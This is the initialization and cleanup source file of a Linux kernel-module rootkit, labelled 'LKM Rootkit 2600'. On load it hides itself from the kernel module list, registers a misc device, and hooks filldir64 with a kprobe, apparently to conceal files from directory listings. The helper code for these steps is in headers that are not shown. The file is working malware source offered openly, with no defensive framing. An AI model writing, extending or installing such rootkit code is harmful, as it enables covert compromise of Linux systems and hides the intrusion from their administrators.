/**
 * @file init.c
 * 
 * @brief Initialization and cleanup functions for the LKM rootkit
 * 
 * This file contains the module initialization and cleanup functions for the
 * LKM rootkit. These functions are responsible for starting and stopping the
 * core functionality of the rootkit.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

#include "include/driver.h"
#include "include/hide.h"
#include "include/kprobe.h"

#include "../include/debug.h"

// Define the license and other module information
MODULE_LICENSE("GPL");
MODULE_AUTHOR("");
MODULE_DESCRIPTION("LKM Rootkit 2600");
MODULE_VERSION("0.1.0");

/**
 * @brief Module initialization function
 * 
 * This function is called when the module is loaded into the kernel. It starts
 * the core functionality of the rootkit.
 * 
 * @return 0 on success, -1 on failure
 */
static int __init mod_init(void)
{
    RKT_DEBUG("LKM rootkit loaded\n");

    hide(); // Hide the rootkit from the kernel module list by default

    if (misc_register(&rk_miscdevice) < 0)
    {
        RKT_DEBUG("Failed to register the rootkit device driver\n");
        return -1;
    }

    RKT_DEBUG("Rootkit device driver registered\n");

    kp.pre_handler = handler_pre;

    if (register_kprobe(&kp) < 0)
    {
        RKT_DEBUG("Failed to register the kprobe\n");
        return -1;
    }

    RKT_DEBUG("Kprobe registered\n");
    RKT_DEBUG("filldir64: at %px\n", kp.addr);
    RKT_DEBUG("handler_pre: %px\n", handler_pre);

    RKT_DEBUG("Rootkit initialized\n");

    return 0;
}

/**
 * @brief Module exit function
 * 
 * This function is called when the module is unloaded from the kernel. It
 * stops the core functionality of the rootkit.
 */
static void __exit mod_exit(void)
{
    unregister_kprobe(&kp);
    RKT_DEBUG("Kprobe unregistered\n");

    misc_deregister(&rk_miscdevice);
    RKT_DEBUG("Rootkit device driver unregistered\n");

    RKT_DEBUG("Rootkit unloaded\n");
}

// Register the module initialization and exit functions
module_init(mod_init);
module_exit(mod_exit);
